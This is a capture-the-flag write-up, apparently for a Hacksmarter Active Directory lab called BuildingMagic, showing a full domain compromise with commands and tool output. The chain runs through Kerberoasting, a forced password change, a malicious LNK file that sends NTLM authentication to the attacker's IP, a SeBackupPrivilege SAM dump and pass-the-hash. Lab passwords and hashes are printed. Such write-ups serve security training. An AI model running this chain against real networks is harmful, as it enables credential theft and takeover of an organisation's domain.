---
cover: ../.gitbook/assets/BuildingMagic.webp
coverY: 0
---

# BuildingMagic(AD)

## Initial Enumeration:

* We were provided with the Initial Set of credentials

```
r.widdleton:lilronron
```

### NMAP :&#x20;

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-07 03:36:38Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BUILDINGMAGIC
|   NetBIOS_Domain_Name: BUILDINGMAGIC
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL
|   DNS_Computer_Name: DC01.BUILDINGMAGIC.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-07T03:37:41+00:00
|_ssl-date: 2026-02-07T03:38:20+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.BUILDINGMAGIC.LOCAL
| Issuer: commonName=DC01.BUILDINGMAGIC.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-06T03:31:18
| Not valid after:  2026-08-08T03:31:18
| MD5:     ae62 7b32 1244 0a36 1e12 5ca9 00f8 e07a
| SHA-1:   1185 842d 831d b9ca 183c d5db 46cd e3fd 8664 f5a6
| SHA-256: d8c2 35a4 2b67 d077 d4aa 1261 426a afd6 c95b 1f74 54b0 4b33 60a1 c39e 93a3 0ad7
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
8080/tcp  open  http          syn-ack ttl 126 Werkzeug httpd 3.1.3 (Python 3.13.3)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Building Magic Application Portal
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

#### SMB(135,139,445):

* We checked the shares accessible to us with the initial user to see if we have access to any interesting share

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ nxc smb buildingmagic.local -u r.widdleton -p lilronron --shares
SMB         10.1.182.28     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.182.28     445    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
SMB         10.1.182.28     445    DC01             [*] Enumerated shares
SMB         10.1.182.28     445    DC01             Share           Permissions     Remark
SMB         10.1.182.28     445    DC01             -----           -----------     ------
SMB         10.1.182.28     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.182.28     445    DC01             C$                              Default share
SMB         10.1.182.28     445    DC01             File-Share                      Central Repository of Building Magic's files.
SMB         10.1.182.28     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.182.28     445    DC01             NETLOGON                        Logon server share 
SMB         10.1.182.28     445    DC01             SYSVOL                          Logon server share 

```

* Here we see that there is no interesting share that we can acces as this user so next thing that comes to my mind is mapping out the AD environment using `bloodhound`.

## Bloodhound :&#x20;

### Collecting the loot  :&#x20;

* Now we collect the bloodhound loot using `nxc`&#x20;

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ nxc ldap 10.1.182.28 -u r.widdleton -p lilronron --bloodhound --collect all --dns-server 10.1.182.28
LDAP        10.1.182.28     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.182.28     389    DC01             [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron 
LDAP        10.1.182.28     389    DC01             Resolved collection methods: rdp, psremote, group, acl, dcom, container, session, objectprops, localadmin, trusts
LDAP        10.1.182.28     389    DC01             Done in 0M 56S
LDAP        10.1.182.28     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.182.28_2026-02-06_224527_bloodhound.zip
```

### Bloodhound Analysis :&#x20;

* Now we analyze the current user privileges

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

* Here we see that this user does not have any outbound object control
* The next thing that comes to my mind is to see all the Kerberoastable users.

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

* Here we saw that the user `R.HAGGARD` is kerberoastable.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ GetUserSPNs.py buildingmagic.local/r.widdleton:'lilronron' -dc-ip 10.1.182.28 -request
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------------------  ---------  --------  --------------------------  --------------------------  ----------
HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:04.002067  2025-05-15 18:34:51.644710             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$f2f82a51ff53820a0619b8b2d03b99d3$683c6eefeaae696b1e5bc028b4cf617b3e8a0cfc387df4c77cc395cc23b0faee2d808efcc588d72fa6fbaa6b6c7192a2e26da2b18ac31344df0747d9a899d7bebc61b8ab398fe0a79e3b78bd2abf4915a131bb6ef8c6f88a0250462b08d2b22e3b2f5e3e05bae45d43b33f1f7424a6eae0f1b3c89bb7a9c6e49881e8343f158c8c0c0e13119e6deb9dfe5d826c29bfa4aa3c3657f0230c14cfce69bf9f84674fc93537c785793d9265c3465e2ca94ba569977f2c8ce7beab492f7d0bc5e3c35ed73ed01888cc03e93ff1e93cbd72df277789e3f80bb751eda2de7d6968ffc7fa07a94ebdfd704db0ea45fa5616234d3d81f4b31211193876e27bab1c3c31cdb28191e2c4dd858daa24f581afd8b42f20836dac49c1ef231eab07082a2bac45f8e585aad47a3383921576dd4fbef45e39eeb8cbfa24a97d3c530986fa03918d7ed46e7cda729bf8bf5b71321bb0cee5c24555ad3f5ecb2d8dc55b57dfe9017cbd4aec9133b0002052beae731b6d572daa3b0556be427f71d5c693292608a8ffde8febd3a31618b47bcb5d7f10b95ebb121c80512bc1ac8678acc896ce99384b4f625897f596de223de59af7a96cf4563565c70249aee2d2a49cfda514a29f511f41c2f2853b81e51386571585f55b027eb0c4bf66adcacc84f2f25c8ff209848f0a02e4847c5a6c8d6e41d92862019fe09a8d25452daf686cd4108dabeb94170989f9f7da72c90be4399bea05e5b04596b3b6681cd3738035e9c75054e3771d335a54fd2e1eeff8fdd9206fef8530e41311f403009273d6c3f0e9064d9a458ed46c5e6a11fde4c30cf136b828b4a97bb9766df792dc6689f45e7812186c82254f4808ee985ac8850a91a07140d0d86e903ab033b9b01d7400654541f49f3d347f3c4f28cd91e777d9ebdeb61826b76735ace2ebf40a4d6509870b533d0a5d3c572cdc429b4f97e4aed114a1f05ea10a2799c7b4fe3cbe040b2b8ba3832369cc21338caa9c189b984c5f13f791e9d7bee1abda192c88538200f9451c5168d01dbc4751f73e663aeb33a3b5864f8495d31b5ba163a81e7a8fdd6a5630defa99ebc8583c0d6025a000d2c06a5e1b42856c0497887f28d31059780a2c80d89f9d2964126655c0fe5f6318a5d896f4a2ff30bd8c84139af712e81d29240a15c0ca6f0b7d5c7cee692605b92ddbcfcc5286cfec9da3646da5170c3bc296ce92240a6b3a27c16b3036fca8200832cc9fe8dcb4a7467bc497c67627b6bec24288ed632ca0fae0c62ae031595033c9641a2ea9d9bf1e560464105678dda4a1a23de0d67dc659f1e84556da208be0caab44232887550f09b3aead62bc7eac9fb6464791cb052c5d2bd7a4d8266c58692ad8485172871a922601b5bb045008b6999137f340d2b3e606e225d23798070f4691e3880e45816b944f897c7c463f0906389bf81094ecc4cf700195d98e39d7076140eef73d777d4f661e0756da38e6c8f878575948a45555aa287fe6eee64e37f9b28df555dc1a00d1cc724b52334afffa97754af0cb4404b960f17e472f6f0e56a08556
```

* Now we crack this hash using `hashcat`.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ hashcat hash.txt  /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$b6924df4283c11ed8a59f25936012e7b$bd2621fe2462d283cea196d5c556bd106c11fdb1ae790dbe1c2c8bb65317025247f11a2dabc9a8ab0709322bf3b9fade4b1adbf5f52f7e78e25ba2788e7c3b9a3fbfdf1f05b2ec3dee914fdaa9c77fcf039e012ae21e0e932c35e147021ccf83be2da26a76bb0ea577ac595e705a0f7b6ef9341bdcda4cf39412137ef33cd5efcf753e44650d9d168a5ad7129383772b0a5178de1327e3762e297ff81ecf6a095bc1201b3807ff2846b5844f88b5f1450c8554d517218c88f2eb3e39da4aa00d0e488ac8f48c5cb9fa540e20d8251e60805aff195370e1978d24f638f0850fe47772f69658409d78353e53a4c9cef2ca622c72eb0c7a258dfc8e6ffa3e945b8957252561cb3c8a0ad654f99861f8847b05cfdeb39f400db31f03252b0b3dcc29ae0e7b5e26991ac905ac4e82cd202ef392d1f86ab570edd52ae05946016711c92c2915079c65db6e3bdaa210900fc6239ccc5e187a66a36211c139d307c15b96157247c5c6709c72c6ce0aab94e8a348d82d90db482d4b9cfc9aa1efe27af3f4ae4cd6e3c62eec21a83d3f0b6c0ca1f006df6bd909753a54e84bb141c44c581da21c5bf56bf706ee8b11fed4f12956564bff77c7e648203e452f64f57b21970ba38ab2940295d46499bb72ef42c31c461cef9d74b7079c7ebc0f0318fe14cffe023c333c2fcc6e28f75f60e6229fd1255453f0d33a62c1eba87fdb15bc780b28bd5c96ca735d9cc501a51cfa2f58e3b76ce0d31c36f4301a9c896ac114e272b51e59ca6d8275b9996572b020300dd56273c97ff85b389393deb59d6d40698ce1d7fdf15c3e2f89ca21f0fea93c2e54baae76bf8dcfce29201bdb5e8b635d12f8b0c488cac84841d80ec543da74f92714bc8e8277c23264c157b92bff7cb928ad24fdb6bb0183236d86e692a1d73b58c94e51f1cbb4627859fce4209b9b76642088bfd3ab0c527e1c4584e7e7673941c0ce965da82c26f54daf568fde01b555ab8723e55a6c75f8d9a5163d11ac093e67b5abe41c6309f2e14feb4c10d9d3b7a51124b735c82cab8c79d3c1eaaaeacc7a7d49c3fa7bf8891c76dfb8d145e76466ccd7562b323c95e3602033bf7bf932f1d473beccb9d71ca234f53b8dc7eaa21a3d012830f667818296bf9bd3cdee7d87668cc8eb2f1c1e7471339096569bb9970e01cfcd06fa33d8b4e1e85c757b76fc470b9b9d7b19dfdfd1ccf4a117e90b10443b2a53ef8e60074008d93608591462a73b52e636e1493992587161a81488d8d9badd0ce149994ab7cac7acb9a105d30d6d73a4bde344dccb9fe4740648006d243427d6e8710c767642bc5836b1006638420098e49822cf9bb85464b2cc19f120e2e73a54343a1c7928fe3014d99e33ceee5281930f8be7b9f009ce4ef653f08ec08c592f4745192ace666ddcde5457346f23edbeec847f3b4762de4d5336da9bf6c230c116ed741f28ee267a72a1724936dd0b4218ca86ecdee38f39e9f79b90992cbaf758a9967747370c2528d93fa8085f75d864ad6572ca8c53d627ffe18b032ff1169187a0c167802b20ffb4:rubeushagrid
```

* Here we see that the password cracked is `rubeushagrid`
* We have now successfully compromised another user `r.haggard`.

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

* upon analyzing we see that this user has a ForceChangePassword right over `H.POTCH` user.

```
net rpc password "H.POTCH" "newP@ssword2022" -U "buildingmagic.local"/"r.haggard"%"rubeushagrid" -S "dc01.buildingmagic.local"
```

* Now we check the shares accessible to `H.POTCH` user to see if any interesting shares are accessible.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ nxc smb buildingmagic.local -u h.potch -p newP@ssword2022 --shares
SMB         10.1.182.28     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.182.28     445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
SMB         10.1.182.28     445    DC01             [*] Enumerated shares
SMB         10.1.182.28     445    DC01             Share           Permissions     Remark
SMB         10.1.182.28     445    DC01             -----           -----------     ------
SMB         10.1.182.28     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.182.28     445    DC01             C$                              Default share
SMB         10.1.182.28     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
SMB         10.1.182.28     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.182.28     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.182.28     445    DC01             SYSVOL          READ            Logon server share 
```

* we saw that this user has read and write access over `File-Share`
* So we would be using the `SLINKY` module from `nxc` to create a malicious `LNK` file which is a windows shortcut file and it'll point towards our IP and we started our responder on another terminal

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ nxc smb buildingmagic.local -u h.potch -p newP@ssword2022 -M slinky -o NAME=sneaky.lnk SERVER=10.200.34.139 SHARES=File-Share
/home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         10.1.182.28     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.182.28     445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:newP@ssword2022 
SMB         10.1.182.28     445    DC01             [*] Enumerated shares
SMB         10.1.182.28     445    DC01             Share           Permissions     Remark
SMB         10.1.182.28     445    DC01             -----           -----------     ------
SMB         10.1.182.28     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.182.28     445    DC01             C$                              Default share
SMB         10.1.182.28     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
SMB         10.1.182.28     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.182.28     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.182.28     445    DC01             SYSVOL          READ            Logon server share 
SLINKY      10.1.182.28     445    DC01             [+] Found writable share: File-Share
SLINKY      10.1.182.28     445    DC01             [+] Created LNK file on the File-Share share
```

## Shell as `h.grangon` :

* We got the NTLMv2 Hash for the user `H.GRANGON`  on our responder and we cracked it using `hashcat` .

```
[SMB] NTLMv2-SSP Client   : 10.1.182.28
[SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon
[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:3cdc6941b5fb0383:A997626CCE2433252A24DFF7E8FB8F71:010100000000000000D87CE0C297DC011009B2644B2C4A180000000002000800530055005A00350001001E00570049004E002D00580034005700420057004D005000520032005000490004003400570049004E002D00580034005700420057004D00500052003200500049002E00530055005A0035002E004C004F00430041004C0003001400530055005A0035002E004C004F00430041004C0005001400530055005A0035002E004C004F00430041004C000700080000D87CE0C297DC01060004000200000008003000300000000000000000000000004000001957C4C2BE8BE5FDC9F59545AA1810FDD573E063D0EA5257EAD33D610B50931F0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330034002E003100330039000000000000000000  
```

```
H.GRANGON::BUILDINGMAGIC:3cdc6941b5fb0383:a997626cce2433252a24dff7e8fb8f71:010100000000000000d87ce0c297dc011009b2644b2c4a180000000002000800530055005a00350001001e00570049004e002d00580034005700420057004d005000520032005000490004003400570049004e002d00580034005700420057004d00500052003200500049002e00530055005a0035002e004c004f00430041004c0003001400530055005a0035002e004c004f00430041004c0005001400530055005a0035002e004c004f00430041004c000700080000d87ce0c297dc01060004000200000008003000300000000000000000000000004000001957c4c2be8be5fdc9f59545aa1810fdd573e063d0ea5257ead33d610b50931f0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330034002e003100330039000000000000000000:magic4ever
```

* The password we got is `magic4ever`.
* We have successfully compromised another user and from Bloodhound we saw that this user is a part of remote management group so we can use `evil-winrm`.

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

* We successfully got the `user.txt` which is the user flag

## Access as `Admininstrator` :&#x20;

* We now checked the  privileges that this current user has

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

* We found that the user has `SeBackupPrivilege` and after a bit of research, we found an Interesting way

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

* We now use it

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

```
*Evil-WinRM* PS C:\Temp> download sam
                                        
Info: Downloading C:\Temp\sam to sam
                                        
```

* Now we use a popular tool named `pypykatz` to dump the hashes and retrieved the `Administrator` hash.

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/BuildingMagic]
└─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: f61a94fb13f74350a1f87f509c8c455c
============== SAM hive secrets ==============
HBoot Key: 1412e6548129435016d5f9cda187a78a10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


```

* supposedly the administrator did not seem to work for us and we were stuck for a while.

```
psexec.py buildingmagic.local/administrator@10.1.182.28 -hashes 'aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce' 
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.

```

* After that i figured out using Bloodhound that the user `a.flatch` is a member of the administrator group so we used this hash with the user and finally got a hit.

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

* now we got our `root.txt` which is the root flag and have successfully solved the machine!!!
